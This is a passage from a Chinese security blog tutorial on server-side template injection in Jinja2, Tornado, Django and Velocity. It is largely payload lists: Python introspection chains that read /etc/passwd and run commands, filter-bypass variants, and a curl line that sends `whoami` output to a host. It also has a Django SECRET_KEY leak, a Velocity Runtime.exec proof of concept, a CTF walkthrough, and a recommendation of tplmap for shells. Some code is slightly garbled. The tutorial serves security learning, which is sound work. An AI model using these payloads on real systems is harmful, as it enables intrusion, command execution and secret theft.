<p><span style="font-size: 14px">既然大概知道原理跟利用，我这里不再废话，直接给出大佬们各种绕过payload：</span></p>
<h3>基础payload：<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-4JKPJ4"><code-line class="line-numbers-rows"></code-line>获得基类
<code-line class="line-numbers-rows"></code-line>#python2.7
<code-line class="line-numbers-rows"></code-line>''.__class__.__mro__[2]
<code-line class="line-numbers-rows"></code-line>{}.__class__.__bases__[0]
<code-line class="line-numbers-rows"></code-line>().__class__.__bases__[0]
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0]
<code-line class="line-numbers-rows"></code-line>request.__class__.__mro__[1]
<code-line class="line-numbers-rows"></code-line>#python3.7
<code-line class="line-numbers-rows"></code-line>''.__。。。class__.__mro__[1]
<code-line class="line-numbers-rows"></code-line>{}.__class__.__bases__[0]
<code-line class="line-numbers-rows"></code-line>().__class__.__bases__[0]
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0]
<code-line class="line-numbers-rows"></code-line>request.__class__.__mro__[1]
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>#python 2.7
<code-line class="line-numbers-rows"></code-line>#文件操作
<code-line class="line-numbers-rows"></code-line>#找到file类
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[40]
<code-line class="line-numbers-rows"></code-line>#读文件
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
<code-line class="line-numbers-rows"></code-line>#写文件
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>#命令执行
<code-line class="line-numbers-rows"></code-line>#os执行
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
<code-line class="line-numbers-rows"></code-line>#eval,impoer等全局函数
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
<code-line class="line-numbers-rows"></code-line>[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>#python3.7
<code-line class="line-numbers-rows"></code-line>#命令执行
<code-line class="line-numbers-rows"></code-line>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
<code-line class="line-numbers-rows"></code-line>#文件操作
<code-line class="line-numbers-rows"></code-line>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
<code-line class="line-numbers-rows"></code-line>#windows下的os命令
<code-line class="line-numbers-rows"></code-line>"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()</code-pre></pre>
</div>
<h3>&nbsp;一些绕waf的姿势：<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p><strong>过滤[</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-jBDsjX"><code-line class="line-numbers-rows"></code-line>#getitem、pop
<code-line class="line-numbers-rows"></code-line>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
<code-line class="line-numbers-rows"></code-line>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()</code-pre></pre>
</div>
<p><strong>过滤引号</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-AHYY3x"><code-line class="line-numbers-rows"></code-line>#chr函数
<code-line class="line-numbers-rows"></code-line>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
<code-line class="line-numbers-rows"></code-line>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
<code-line class="line-numbers-rows"></code-line>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
<code-line class="line-numbers-rows"></code-line>#命令执行
<code-line class="line-numbers-rows"></code-line>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
<code-line class="line-numbers-rows"></code-line>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
<code-line class="line-numbers-rows"></code-line>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id</code-pre></pre>
</div>
<p><strong>过滤下划线</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-kk6R47"><code-line class="line-numbers-rows"></code-line>{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code-pre></pre>
</div>
<p><strong>过滤花括号</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-TQiFZY"><code-line class="line-numbers-rows"></code-line>#用{%%}标记
<code-line class="line-numbers-rows"></code-line>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}</code-pre></pre>
</div>
<p><strong>利用示例：</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-TitcRm"><code-line class="line-numbers-rows"></code-line>{% for c in [].__class__.__base__.__subclasses__() %}
<code-line class="line-numbers-rows"></code-line>{% if c.__name__ == 'catch_warnings' %}
<code-line class="line-numbers-rows"></code-line>  {% for b in c.__init__.__globals__.values() %}
<code-line class="line-numbers-rows"></code-line>  {% if b.__class__ == {}.__class__ %}
<code-line class="line-numbers-rows"></code-line>    {% if 'eval' in b.keys() %}
<code-line class="line-numbers-rows"></code-line>      {{ b['eval']('__import__("os").popen("id").read()') }}         //popen的参数就是要执行的命令
<code-line class="line-numbers-rows"></code-line>    {% endif %}
<code-line class="line-numbers-rows"></code-line>  {% endif %}
<code-line class="line-numbers-rows"></code-line>  {% endfor %}
<code-line class="line-numbers-rows"></code-line>{% endif %}
<code-line class="line-numbers-rows"></code-line>{% endfor %}</code-pre></pre>
</div>
<p><span style="font-size: 14px">这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</span></p>
<p><span style="font-size: 14px">github地址：<a href="https://github.com/epinna/tplmap" rel="noopener">https://github.com/epinna/tplmap</a></span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903230151729-80521204.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903230151729-80521204.png" alt="" width="563" height="379" loading="lazy" class="medium-zoom-image"></a></p>
<p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
<h2>tornado<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p><span style="font-size: 14px">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。</span></p>
<p><span style="font-size: 14px">以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的"FOO"，在进行加载模板并输出，且未对name值进行安全检查输入情况。</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-E4TJnY"><code-line class="line-numbers-rows"></code-line>import tornado.template
<code-line class="line-numbers-rows"></code-line>import tornado.ioloop
<code-line class="line-numbers-rows"></code-line>import tornado.web
<code-line class="line-numbers-rows"></code-line>TEMPLATE = '''
<code-line class="line-numbers-rows"></code-line>&lt;html&gt;
<code-line class="line-numbers-rows"></code-line> &lt;head&gt;&lt;title&gt; Hello {{ name }} &lt;/title&gt;&lt;/head&gt;
<code-line class="line-numbers-rows"></code-line> &lt;body&gt; Hello max &lt;/body&gt;
<code-line class="line-numbers-rows"></code-line>&lt;/html&gt;
<code-line class="line-numbers-rows"></code-line>'''
<code-line class="line-numbers-rows"></code-line>class MainHandler(tornado.web.RequestHandler):
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    def get(self):
<code-line class="line-numbers-rows"></code-line>        name = self.get_argument('name', '')
<code-line class="line-numbers-rows"></code-line>        template_data = TEMPLATE.replace("FOO",name)
<code-line class="line-numbers-rows"></code-line>        t = tornado.template.Template(template_data)
<code-line class="line-numbers-rows"></code-line>        self.write(t.generate(name=name))
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>application = tornado.web.Application([(r"/", MainHandler),], debug=True, static_path=None, template_path=None)
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>if __name__ == '__main__':
<code-line class="line-numbers-rows"></code-line>    application.listen(8000)
<code-line class="line-numbers-rows"></code-line>    tornado.ioloop.IOLoop.instance().start()</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911185502398-402029706.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911185502398-402029706.png" alt="" width="719" height="300" loading="lazy" class="medium-zoom-image"></a></p>
<p>这里拿一道BUUCTF的题来演示一下tornado render模板注入：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903230948354-1221642454.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903230948354-1221642454.png" alt="" width="563" height="140" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="color: rgba(255, 153, 0, 1)">flag.txt：</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903231123661-1731456025.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903231123661-1731456025.png" alt="" width="208" height="70" loading="lazy"></a></p>
<p><span style="color: rgba(255, 153, 0, 1)">welcome.txt</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903231255390-418247473.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903231255390-418247473.png" alt="" width="128" height="57" loading="lazy"></a></p>
<p><span style="color: rgba(255, 153, 0, 1)">hints.txt</span></p>
<p><span style="color: rgba(255, 153, 0, 1)"><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903231526172-982886875.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903231526172-982886875.png" alt="" width="292" height="66" loading="lazy" class="medium-zoom-image"></a></span></p>
<p><span style="font-size: 14px">根据上面的信息，我们知道flag在/fllllllllllllag文件中</span></p>
<p><span style="font-size: 14px">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</span></p>
<p><span style="font-size: 14px">最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-SDfDNT"><code-line class="line-numbers-rows"></code-line>http://4dd65e36-edbf-4402-b6a3-75993b8c618d.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=284090432706edeffa4679e60f0fff03</code-pre></pre>
</div>
<p><span style="font-size: 14px">推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</span></p>
<p><span style="font-size: 14px">在tornado模板中，存在一些可以访问的快速对象，比如<span style="background-color: rgba(255, 255, 153, 1)"> {{escape(handler.settings["cookie"])}}</span>，这个其实就是<span style="background-color: rgba(255, 255, 153, 1)">handler.settings</span>对象，里面存储着一些环境变量，具体分析请参照《<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" rel="noopener">python SSTI tornado render模板注入</a>》。</span></p>
<p><span style="font-size: 14px">观察错误页面，发现页面返回的由msg的值决定</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903233530649-1247101816.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903233530649-1247101816.png" alt="" width="559" height="103" loading="lazy" class="medium-zoom-image"></a></p>
<p>修改msg的值注入<span style="background-color: rgba(255, 255, 153, 1)">{{handler.settings}}</span>，获得环境变量</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903233721068-1721567768.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903233721068-1721567768.png" alt="" width="676" height="93" loading="lazy" class="medium-zoom-image"></a></p>
<p>得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-sGMRBK"><code-line class="line-numbers-rows"></code-line>import hashlib
<code-line class="line-numbers-rows"></code-line>hash = hashlib.md5()
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>filename='/fllllllllllllag'
<code-line class="line-numbers-rows"></code-line>cookie_secret="ad53693f-47f6-4c89-b072-0673e0fbbc17"
<code-line class="line-numbers-rows"></code-line>hash.update(filename.encode('utf-8'))
<code-line class="line-numbers-rows"></code-line>s1=hash.hexdigest()
<code-line class="line-numbers-rows"></code-line>hash = hashlib.md5()
<code-line class="line-numbers-rows"></code-line>hash.update((cookie_secret+s1).encode('utf-8'))
<code-line class="line-numbers-rows"></code-line>print(hash.hexdigest())</code-pre></pre>
</div>
<p>得到filehash=ceba5d7a8acd8c4fb77cfb58c9534971，获取flag</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903234158628-1148950140.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903234158628-1148950140.png" alt="" width="654" height="93" loading="lazy" class="medium-zoom-image"></a></p>
<h2>Django<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p><span style="color: rgba(0, 0, 0, 1); font-size: 14px">先看存在漏洞的代码：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-ktFfN2"><code-line class="line-numbers-rows"></code-line>def view(request, *args, **kwargs):
<code-line class="line-numbers-rows"></code-line>    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
<code-line class="line-numbers-rows"></code-line>    return HttpResponse(template.format(user=request.user))</code-pre></pre>
</div>
<p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量<span style="background-color: rgba(255, 255, 153, 1)">request.user</span> ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p>
<p>后来发现Django自带的应用 "admin"（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911002243408-1781833415.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911002243408-1781833415.png" alt="" width="667" height="166" loading="lazy" class="medium-zoom-image"></a></p>
<p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<p><span style="color: rgba(0, 0, 0, 1); font-size: 14px">payload如下：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-XdneZX"><code-line class="line-numbers-rows"></code-line>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code-pre></pre>
</div>
<h1>Java中的SSTI<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
<p>java常见的引擎：FreeMarker， velocity</p>
<h2>velocity<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p>（以下板块参照自《<a href="https://xz.aliyun.com/t/8135#toc-2" target="_blank" rel="noopener">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a>》）</p>
<p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
<h3>基本语法<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p><strong>语句标识符</strong></p>
<p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p>
<p><strong>变量</strong></p>
<p><span>$</span>用来标识一个变量，比如模板文件中为Hello <span>$</span>a，可以获取通过上下文传递的<span>$</span>a</p>
<p><strong>声明</strong></p>
<p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-YCianj"><code-line class="line-numbers-rows"></code-line>#set($a ="velocity")
<code-line class="line-numbers-rows"></code-line>#set($b=1)
<code-line class="line-numbers-rows"></code-line>#set($arrayName=["1","2"])</code-pre></pre>
</div>
<p><strong>注释</strong></p>
<p>单行注释为##，多行注释为成对出现的#* ............. *#</p>
<p><strong>条件语句</strong></p>
<p>以if/else为例：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-X5bR7c"><code-line class="line-numbers-rows"></code-line>#if($foo&lt;10)
<code-line class="line-numbers-rows"></code-line>    &lt;strong&gt;1&lt;/strong&gt;
<code-line class="line-numbers-rows"></code-line>#elseif($foo==10)
<code-line class="line-numbers-rows"></code-line>    &lt;strong&gt;2&lt;/strong&gt;
<code-line class="line-numbers-rows"></code-line>#elseif($bar==6)
<code-line class="line-numbers-rows"></code-line>    &lt;strong&gt;3&lt;/strong&gt;
<code-line class="line-numbers-rows"></code-line>#else
<code-line class="line-numbers-rows"></code-line>    &lt;strong&gt;4&lt;/strong&gt;
<code-line class="line-numbers-rows"></code-line>#end</code-pre></pre>
</div>
<p><strong>转义字符</strong></p>
<p>如果<span>$</span>a已经被定义，但是又需要原样输出<span>$</span>a，可以试用\转义作为关键的<span>$</span></p>
<h3>基础使用<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p>使用Velocity主要流程为：</p>
<ul>
<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
<li>创建用于存储预传递到模板文件的数据的上下文</li>
<li>选择具体的模板文件，传递数据完成渲染</li>
</ul>
<p>VelocityTest.java</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-FWsBpy"><code-line class="line-numbers-rows"></code-line>package Velocity;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>import org.apache.velocity.Template;
<code-line class="line-numbers-rows"></code-line>import org.apache.velocity.VelocityContext;
<code-line class="line-numbers-rows"></code-line>import org.apache.velocity.app.VelocityEngine;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>import java.io.StringWriter;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>public class VelocityTest {
<code-line class="line-numbers-rows"></code-line>    public static void main(String[] args) {
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        VelocityEngine velocityEngine = new VelocityEngine();
<code-line class="line-numbers-rows"></code-line>        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, "file");
<code-line class="line-numbers-rows"></code-line>        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, "src/main/resources");
<code-line class="line-numbers-rows"></code-line>        velocityEngine.init();
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        VelocityContext context = new VelocityContext();
<code-line class="line-numbers-rows"></code-line>        context.put("name", "Rai4over");
<code-line class="line-numbers-rows"></code-line>        context.put("project", "Velocity");
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        Template template = velocityEngine.getTemplate("test.vm");
<code-line class="line-numbers-rows"></code-line>        StringWriter sw = new StringWriter();
<code-line class="line-numbers-rows"></code-line>        template.merge(context, sw);
<code-line class="line-numbers-rows"></code-line>        System.out.println("final output:" + sw);
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>}</code-pre></pre>
</div>
<p>模板文件：src/main/resources/test.vm</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-cn8XYp"><code-line class="line-numbers-rows"></code-line>Hello World! The first velocity demo.
<code-line class="line-numbers-rows"></code-line>Name is $name.
<code-line class="line-numbers-rows"></code-line>Project is $project</code-pre></pre>
</div>
<p>输出结果：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-xaeRsR"><code-line class="line-numbers-rows"></code-line>final output:
<code-line class="line-numbers-rows"></code-line>Hello World! The first velocity demo.
<code-line class="line-numbers-rows"></code-line>Name is Victor Zhang.
<code-line class="line-numbers-rows"></code-line>Project is Velocity
<code-line class="line-numbers-rows"></code-line>java.lang.UNIXProcess@12f40c25</code-pre></pre>
</div>
<p><span style="font-size: 14px">通过 <span style="background-color: rgba(255, 255, 153, 1)">VelocityEngine</span> 创建模板引擎，接着&nbsp;<span style="background-color: rgba(255, 255, 153, 1)">velocityEngine.</span><span style="background-color: rgba(255, 255, 153, 1)">setProperty&nbsp;</span>设置模板路径 src/main/resources、加载器类型为file，最后通过 <span style="background-color: rgba(255, 255, 153, 1)">velocityEngine.init()</span> 完成引擎初始化。</span></p>
<p><span style="font-size: 14px">通过 <span style="background-color: rgba(255, 255, 153, 1)">VelocityContext()</span> 创建上下文变量，通过put添加模板中使用的变量到上下文。</span></p>
<p><span style="font-size: 14px">通过 <span style="background-color: rgba(255, 255, 153, 1)">getTemplate</span> 选择路径中具体的模板文件test.vm，创建 <span style="background-color: rgba(255, 255, 153, 1)">StringWriter</span> 对象存储渲染结果，然后将上下文变量传入 <span style="background-color: rgba(255, 255, 153, 1)">template.merge</span> 进行渲染。</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200907173719066-1030164230.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200907173719066-1030164230.png" alt="" width="285" height="139" loading="lazy" class="medium-zoom-image"></a></p>
<p>这里使用java-sec-code里面的SSTI代码：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200907191011269-128540012.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200907191011269-128540012.png" alt="" width="399" height="422" loading="lazy" class="medium-zoom-image"></a></p>
<p>poc：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-D4S4Kj"><code-line class="line-numbers-rows"></code-line>http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200907192034956-1485346370.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200907192034956-1485346370.png" alt="" width="596" height="339" loading="lazy" class="medium-zoom-image"></a></p>
<p>参照《<a href="https://xz.aliyun.com/t/7466" target="_blank" rel="noopener">白头搔更短，SSTI惹人心！</a>》简单进行调试</p>
<p>在最初的Controller层下断点，来追踪poc的解析过程：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908095030110-571936567.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908095030110-571936567.png" alt="" width="874" height="383" loading="lazy" class="medium-zoom-image"></a></p>
<p>（template -&gt; instring）进入 <span style="background-color: rgba(255, 255, 153, 1)">Velocity.evaluate</span> 方法：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908112550988-1581803954.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908112550988-1581803954.png" alt="" width="879" height="373" loading="lazy" class="medium-zoom-image"></a></p>
<p>（instring -&gt; reader）继续跟进 <span style="background-color: rgba(255, 255, 153, 1)">evaluate</span> 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908112728222-13161049.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908112728222-13161049.png" alt="" width="879" height="296" loading="lazy" class="medium-zoom-image"></a></p>
<p>跟进 <span style="background-color: rgba(255, 255, 153, 1)">StringReader</span> 方法查看详情：<br><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908113941507-617770245.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908113941507-617770245.png" alt="" width="884" height="344" loading="lazy" class="medium-zoom-image"></a></p>
<p>（reader -&gt; nodeTree）继续跟进 <span style="background-color: rgba(255, 255, 153, 1)">this.evaluate()</span> 方法</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908115525966-63941808.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908115525966-63941808.png" alt="" width="886" height="380" loading="lazy" class="medium-zoom-image"></a></p>
<p>（nodeTree -&gt; writer）继续跟进render方法</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908141827072-400777989.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908141827072-400777989.png" alt="" width="890" height="442" loading="lazy" class="medium-zoom-image"></a></p>
<p>emmm...继续跟进render</p>
